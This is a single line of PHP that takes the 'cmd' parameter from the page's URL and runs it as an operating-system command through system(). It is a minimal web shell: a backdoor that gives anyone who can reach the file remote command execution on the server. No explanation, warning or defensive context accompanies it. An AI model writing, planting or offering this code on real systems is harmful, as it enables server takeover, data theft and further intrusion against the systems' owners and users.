<?php $cmd=$_GET['cmd']; system($cmd);?>
